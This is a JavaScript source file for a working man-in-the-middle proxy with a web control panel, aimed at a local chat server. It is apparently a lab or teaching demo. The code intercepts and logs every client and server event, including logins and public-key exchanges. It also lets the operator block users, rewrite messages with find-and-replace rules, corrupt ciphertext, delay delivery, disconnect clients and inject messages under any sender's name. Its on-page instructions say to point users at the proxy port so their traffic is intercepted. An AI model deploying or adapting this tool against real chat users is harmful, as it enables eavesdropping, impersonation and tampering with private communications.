// mitm-proxy.js - Real MITM Proxy Server
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const { createProxyMiddleware } = require('http-proxy-middleware');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Proxy configuration
const CHAT_SERVER_URL = 'http://127.0.0.1:5001';
const PROXY_PORT = 5002;

// Tampering settings
let tamperingEnabled = false;
let messageReplacements = new Map();
let blockedUsers = new Set();
let messageDelay = 0;
let corruptNextMessage = false;

const proxyClients = new Map();
const realChatClients = new Map();

console.log('Starting MITM Proxy Server...');

app.use(cors());

app.get('/chat', (req, res) => {
    res.sendFile(__dirname + '/server/templates/index.html');
});

app.get('/static/:file', (req, res) => {
    res.sendFile(__dirname + '/server/static/' + req.params.file);
});

app.get('/proxy', (req, res) => {
    res.sendFile(__dirname + '/server/templates/proxy_client.html');
});

app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MITM Proxy Controller</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: 1.5fr 1.2fr;
            gap: 20px;
        }
        
        .panel {
            background: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        
        .control-panel {
            background: #2c3e50;
            color: white;
            min-width: 350px;
            width: 420px;
            max-width: 100%;
            padding: 20px;
            box-sizing: border-box;
            word-break: break-word;
            border-radius: 10px;
        }
        
        .proxy-warning {
            background: linear-gradient(45deg, #e74c3c, #c0392b);
            color: white;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 8px;
            text-align: center;
            font-weight: bold;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.8; }
        }
        
        h1, h2 {
            color: #2c3e50;
            margin-bottom: 20px;
        }
        
        .control-panel h2 {
            color: #ecf0f1;
            border-bottom: 2px solid #3498db;
            padding-bottom: 10px;
        }
        
        input[type="text"], input[type="number"] {
            width: 100%;
            padding: 10px;
            margin: 5px 0 15px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }
        
        button {
            background: #3498db;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px 0;
            transition: background 0.3s;
            width: 100%;
        }
        
        button:hover {
            background: #2980b9;
        }
        
        button.danger {
            background: #e74c3c;
        }
        
        button.danger:hover {
            background: #c0392b;
        }
        
        button.safe {
            background: #27ae60;
        }
        
        button.safe:hover {
            background: #229954;
        }
        
        #proxyLog {
            height: 400px;
            background: #34495e;
            color: #ecf0f1;
            padding: 15px;
            overflow-y: auto;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            white-space: pre-wrap;
            margin-bottom: 15px;
            word-break: break-all;
            overflow-wrap: break-word;
            max-width: 100%;
            box-sizing: border-box;
        }
        
        .status-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 8px;
        }
        
        .status-connected {
            background: #27ae60;
        }
        
        .status-disconnected {
            background: #e74c3c;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin: 20px 0;
        }
        
        .stat-box {
            background: #34495e;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
        }
        
        .stat-number {
            font-size: 24px;
            font-weight: bold;
            color: #3498db;
        }
        
        .stat-label {
            font-size: 12px;
            color: #bdc3c7;
        }
        
        .input-group {
            display: flex;
            gap: 10px;
            margin: 10px 0;
        }
        
        .input-group input {
            flex: 1;
            margin: 0;
        }
    </style>
</head>
<body>
    <div class="proxy-warning">
        MITM PROXY CONTROLLER - Monitor and manipulate all chat communications
    </div>

    <div class="container">
        <div class="panel">
            <h1>Network Traffic Monitor</h1>
            
            <div class="stats-grid">
                <div class="stat-box">
                    <div class="stat-number" id="messageCount">0</div>
                    <div class="stat-label">Messages Intercepted</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="clientCount">0</div>
                    <div class="stat-label">Connected Clients</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="tamperCount">0</div>
                    <div class="stat-label">Messages Tampered</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="blockCount">0</div>
                    <div class="stat-label">Blocked Messages</div>
                </div>
            </div>
            
            <h2>Intercept Log</h2>
            <div id="proxyLog"></div>
            
            <button onclick="clearLog()" class="safe">Clear Log</button>
        </div>

        <div class="control-panel">
            <h2>MITM Controls</h2>
            
            <div style="margin-bottom: 20px;">
                <span class="status-indicator" id="statusIndicator"></span>
                <span id="connectionStatus">Connecting to proxy...</span>
            </div>

            <h3>Core Attacks</h3>
            <button onclick="toggleTampering()" id="tamperingBtn" class="danger">Enable Tampering</button>
            <button onclick="corruptNext()" class="danger">Corrupt Next Message</button>
            
            <h3>User Control</h3>
            <input type="text" id="blockUsername" placeholder="Username to block...">
            <button onclick="blockUser()" class="danger">Block User</button>
            <button onclick="unblockAll()" class="safe">Unblock All Users</button>
            
            <h3>Message Manipulation</h3>
            <div class="input-group">
                <input type="text" id="replaceFrom" placeholder="Find text...">
                <input type="text" id="replaceTo" placeholder="Replace with...">
            </div>
            <button onclick="addReplacement()" class="danger">Add Replace Rule</button>
            
            <h3>Network Delays</h3>
            <input type="number" id="delaySeconds" placeholder="Delay in seconds" min="1" max="60" value="5">
            <button onclick="delayMessages()" class="danger">Delay Next Message</button>
            
            <h3>Message Injection</h3>
            <input type="text" id="injectSender" placeholder="Sender (impersonate)...">
            <input type="text" id="injectRecipient" placeholder="Recipient...">
            <input type="text" id="injectText" placeholder="Message to inject...">
            <button onclick="injectMessage()">Inject Fake Message</button>
            
            <h3>Status</h3>
            <button onclick="getStatus()" class="safe">Refresh Status</button>
            <button onclick="disconnectAll()" class="danger">Disconnect All Clients</button>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <script>
        let socket = null;
        let messageCount = 0;
        let tamperCount = 0;
        let blockCount = 0;
        let tamperingEnabled = false;

        // Initialize proxy controller
        function initializeProxyController() {
            console.log("Initializing MITM Proxy Controller...");
            
            // Connect to the MITM proxy server (same port)
            socket = io();
            
            // Set up connection status
            const statusIndicator = document.getElementById('statusIndicator');
            const connectionStatus = document.getElementById('connectionStatus');
            
            socket.on('connect', () => {
                console.log('Connected to MITM proxy');
                statusIndicator.className = 'status-indicator status-connected';
                connectionStatus.textContent = 'Connected to Proxy';
                updateProxyLog('Connected to MITM proxy server');
                getStatus(); 
            });

            socket.on('disconnect', () => {
                console.log('Disconnected from proxy');
                statusIndicator.className = 'status-indicator status-disconnected';
                connectionStatus.textContent = 'Disconnected';
                updateProxyLog('Disconnected from proxy server');
            });

            socket.on('proxy_log', (data) => {
                messageCount++;
                updateCounter('messageCount', messageCount);
                
                const logMessage = data.direction + ' ' + data.event;
                updateProxyLog(logMessage);
                
                if (data.event === 'send_message' || data.event === 'receive_message') {
                    updateProxyLog('   Data: ' + JSON.stringify(data.data));
                }
            });

            socket.on('proxy_status', (data) => {
                updateCounter('clientCount', data.connectedClients);
                tamperingEnabled = data.tamperingEnabled;
                updateTamperingButton();
                
                if (data.blockedUsers.length > 0) {
                    updateProxyLog('Currently blocked users: ' + data.blockedUsers.join(', '));
                }
                
                if (Object.keys(data.replacements).length > 0) {
                    updateProxyLog('Active replacements:');
                    Object.entries(data.replacements).forEach(([from, to]) => {
                        updateProxyLog('   "' + from + '" → "' + to + '"');
                    });
                }
            });
        }

        function sendProxyControl(command) {
            if (socket && socket.connected) {
                socket.emit('proxy_control', command);
                updateProxyLog('Sent command: ' + command.type);
            } else {
                alert('Not connected to proxy server!');
            }
        }

        function toggleTampering() {
            sendProxyControl({ type: 'toggle_tampering' });
            tamperingEnabled = !tamperingEnabled;
            updateTamperingButton();
        }

        function updateTamperingButton() {
            const btn = document.getElementById('tamperingBtn');
            btn.textContent = tamperingEnabled ? 'Disable Tampering' : 'Enable Tampering';
            btn.className = tamperingEnabled ? 'danger' : 'safe';
            updateAttackControls();
        }

        function updateAttackControls() {
            const disabled = !tamperingEnabled;

            document.querySelectorAll('.danger, .attack-control').forEach(btn => {
                btn.disabled = disabled;
                btn.style.opacity = disabled ? 0.5 : 1;
                btn.style.cursor = disabled ? 'not-allowed' : 'pointer';
            });
        }


        function corruptNext() {
            sendProxyControl({ type: 'corrupt_next' });
            tamperCount++;
            updateCounter('tamperCount', tamperCount);
        }

        function blockUser() {
            const username = document.getElementById('blockUsername').value.trim();
            if (username) {
                sendProxyControl({ 
                    type: 'block_user', 
                    username: username 
                });
                document.getElementById('blockUsername').value = '';
                blockCount++;
                updateCounter('blockCount', blockCount);
            } else {
                alert('Please enter a username to block');
            }
        }

        function unblockAll() {
            sendProxyControl({ type: 'unblock_all' });
            blockCount = 0;
            updateCounter('blockCount', blockCount);
        }

        function addReplacement() {
            const from = document.getElementById('replaceFrom').value.trim();
            const to = document.getElementById('replaceTo').value.trim();
            
            if (from && to) {
                sendProxyControl({ 
                    type: 'add_replacement',
                    from: from,
                    to: to
                });
                document.getElementById('replaceFrom').value = '';
                document.getElementById('replaceTo').value = '';
                tamperCount++;
                updateCounter('tamperCount', tamperCount);
            } else {
                alert('Please enter both find and replace text');
            }
        }

        function delayMessages() {
            const seconds = parseInt(document.getElementById('delaySeconds').value) || 5;
            sendProxyControl({ 
                type: 'set_delay',
                seconds: seconds
            });
        }

        function injectMessage() {
            const text = document.getElementById('injectText').value.trim();
            const sender = document.getElementById('injectSender').value.trim();
            const recipient = document.getElementById('injectRecipient').value.trim();
            if (text) {
                sendProxyControl({ 
                    type: 'inject_message',
                    text: text,
                    as: sender,
                    to: recipient
                });
                document.getElementById('injectText').value = '';
            } else {
                alert('Please enter message text to inject');
            }
        }

        function getStatus() {
            sendProxyControl({ type: 'get_status' });
        }

        function disconnectAll() {
            if (confirm('This will disconnect all clients from the chat. Continue?')) {
                sendProxyControl({ type: 'disconnect_all' });
            }
        }

        // UI helper functions
        function updateProxyLog(message) {
            const logElement = document.getElementById('proxyLog');
            const timestamp = new Date().toLocaleTimeString();
            const logEntry = '[' + timestamp + '] ' + message + '\\n';
            
            logElement.textContent += logEntry;
            logElement.scrollTop = logElement.scrollHeight;
        }

        function updateCounter(elementId, value) {
            document.getElementById(elementId).textContent = value;
        }

        function clearLog() {
            document.getElementById('proxyLog').textContent = '';
            updateProxyLog('Log cleared');
        }

        // Initialize when page loads
        window.addEventListener('load', () => {
            initializeProxyController();
            updateProxyLog('MITM Proxy Controller initialized');
            updateProxyLog('Waiting for clients to connect...');
            updateProxyLog('Instructions:');
            updateProxyLog('   1. Have users connect to localhost:5002 instead of 5001');
            updateProxyLog('   2. All their traffic will be intercepted here!');
            updateProxyLog('   3. Use the controls to manipulate their messages');
        });
    </script>
</body>
</html>
    `);
});

app.use('/api', createProxyMiddleware({
    target: CHAT_SERVER_URL,
    changeOrigin: true,
    pathRewrite: {
        '^/api': '', 
    }
}));

// Socket.IO proxy logic
io.on('connection', (socket) => {
    console.log(`Client connected to proxy: ${socket.id}`);
    
    // Create connection to real chat server
    const chatSocket = require('socket.io-client')(CHAT_SERVER_URL, {
        transports: ['websocket', 'polling']
    });
    realChatClients.set(socket.id, chatSocket);
    proxyClients.set(socket.id, socket);
    
    console.log(`Created proxy connection for client ${socket.id}`);

    function logEvent(direction, event, data) {
        const timestamp = new Date().toLocaleTimeString();
        console.log(`[${timestamp}] ${direction} ${event}:`, JSON.stringify(data, null, 2));
        
        io.emit('proxy_log', {
            timestamp,
            direction,
            event,
            data
        });
    }

    const clientEvents = ['register', 'login', 'send_message', 'get_public_key'];
    
    clientEvents.forEach(event => {
        socket.on(event, (data) => {
            logEvent('CLIENT→SERVER', event, data);
            
            let modifiedData = applyClientTampering(event, data, socket.id);
            
            if (modifiedData !== null) {
                chatSocket.emit(event, modifiedData);
            }
        });
    });

    // Forward events from chat server to client (with potential tampering)
    const serverEvents = ['register_response', 'login_response', 'users_list', 'receive_message', 'public_key_response'];
    
    serverEvents.forEach(event => {
        chatSocket.on(event, (data) => {
            logEvent('SERVER→CLIENT', event, data);
            
            let modifiedData = applyServerTampering(event, data, socket.id);
            
            if (modifiedData !== null) {
                if (messageDelay > 0 && event === 'receive_message') {
                    setTimeout(() => {
                        socket.emit(event, modifiedData);
                    }, messageDelay * 1000);
                    messageDelay = 0; 
                } else {
                    socket.emit(event, modifiedData);
                }
            }
        });
    });

    // Handle chat server connection events
    chatSocket.on('connect', () => {
        console.log(`Proxy established connection to chat server for client ${socket.id}`);
        socket.emit('proxy_connected', { status: 'connected' });
    });

    chatSocket.on('connect_error', (error) => {
        console.log(`Chat server connection error for client ${socket.id}:`, error);
        socket.emit('proxy_disconnected', { status: 'error', error: error.message });
    });

    chatSocket.on('disconnect', () => {
        console.log(`Chat server connection lost for client ${socket.id}`);
        socket.emit('proxy_disconnected', { status: 'disconnected' });
    });

    // Handle client disconnect
    socket.on('disconnect', () => {
        console.log(`Client disconnected from proxy: ${socket.id}`);
        if (chatSocket) {
            chatSocket.disconnect();
        }
        realChatClients.delete(socket.id);
        proxyClients.delete(socket.id);
    });

    socket.on('proxy_control', (command) => {
        handleProxyControl(command, socket.id);
    });
});

// Tampering functions
function applyClientTampering(event, data, clientId) {
    if (!tamperingEnabled) return data;

    if (event === 'send_message' && blockedUsers.has(data.nickname)) {
        console.log(`Blocked message from ${data.nickname}`);
        return null; 
    }

    if (event === 'send_message' && data.text) {
        let modifiedText = data.text;
        messageReplacements.forEach((replacement, original) => {
            modifiedText = modifiedText.replace(new RegExp(original, 'gi'), replacement);
        });
        
        if (modifiedText !== data.text) {
            console.log(`Replaced message: "${data.text}" → "${modifiedText}"`);
            data.text = modifiedText;
        }
    }

    if (event === 'send_message' && corruptNextMessage) {
        console.log(`Corrupting message from ${data.nickname}`);
        if (data.text) {
            data.text = "CORRUPTED_BY_MITM_PROXY: " + data.text;
        }
        if (data.ciphertext) {
            data.ciphertext = data.ciphertext.slice(0, -10) + "CORRUPTED";
        }
        corruptNextMessage = false;
    }

    return data;
}

function applyServerTampering(event, data, clientId) {
    if (!tamperingEnabled) return data;

    if (event === 'users_list') {
        console.log(`Original user list: ${data.users.join(', ')}`);
    }

    if (event === 'receive_message') {
        return applyClientTampering('send_message', data, clientId);
    }

    return data;
}

// Proxy control handler
function handleProxyControl(command, clientId) {
    console.log(`Proxy control command: ${command.type}`, command);

    switch (command.type) {
        case 'toggle_tampering':
            tamperingEnabled = !tamperingEnabled;
            console.log(`Tampering ${tamperingEnabled ? 'enabled' : 'disabled'}`);
            break;

        case 'corrupt_next':
            corruptNextMessage = true;
            console.log(`Next message will be corrupted`);
            break;

        case 'block_user':
            blockedUsers.add(command.username);
            console.log(`Blocked user: ${command.username}`);
            break;

        case 'unblock_all':
            blockedUsers.clear();
            console.log(`Unblocked all users`);
            break;

        case 'add_replacement':
            messageReplacements.set(command.from, command.to);
            console.log(`Added replacement: "${command.from}" → "${command.to}"`);
            break;

        case 'set_delay':
            messageDelay = command.seconds;
            console.log(`Next message will be delayed by ${command.seconds} seconds`);
            break;

        case 'inject_message':
            const fakeSender = command.as || 'PROXY_INJECTION';
            const fakeRecipient = command.to || '';
            console.log("command: ", command);
            const isEncrypted = command.encrypted || false;
        
            let msg = {
                nickname: fakeSender,
                recipient: fakeRecipient,
                timestamp: new Date().toISOString()
            };
        
            if (isEncrypted) {
                msg.encrypted = true;
                msg.ciphertext = btoa("CORRUPTED_CIPHER_GIBBERISH");
            } else {
                msg.text = command.text || 'Injected unencrypted message';
            }
        
            proxyClients.forEach((socket, id) => {
                socket.emit('receive_message', msg);
            });
        
            console.log(`Injected ${isEncrypted ? 'ENCRYPTED' : 'PLAINTEXT'} message as "${fakeSender}" to "${fakeRecipient}": "${command.text}"`);
            break;
            
            

        case 'get_status':
            const client = proxyClients.get(clientId);
            if (client) {
                client.emit('proxy_status', {
                    tamperingEnabled,
                    blockedUsers: Array.from(blockedUsers),
                    replacements: Object.fromEntries(messageReplacements),
                    connectedClients: proxyClients.size
                });
            }
            break;
    }
}

// Start the proxy server
server.listen(PROXY_PORT, () => {
    console.log(`MITM Proxy Server running on http://localhost:${PROXY_PORT}`);
    console.log(`Proxying chat server at ${CHAT_SERVER_URL}`);
    console.log(`Clients should connect to this proxy instead of the chat server`);
});

// Export for testing
module.exports = { app, server, io };